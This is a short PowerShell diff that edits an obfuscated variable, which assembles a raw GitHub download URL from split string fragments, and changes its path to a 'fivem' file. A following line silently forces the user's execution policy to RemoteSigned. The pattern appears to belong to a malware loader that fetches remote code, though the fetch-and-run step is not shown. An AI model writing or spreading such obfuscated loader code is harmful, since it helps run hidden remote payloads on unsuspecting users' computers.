@@ -4,9 +4,9 @@ $_0x91A = @(
 "https://raw",
 ".githubusercontent",
 ".com/t3rm1n4l-inf1c0z",
-"/wasd/refs",
+"/fivem/refs",
 "/heads/main/",
-"wasd"
+"-"
 ) -join ""
 
 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
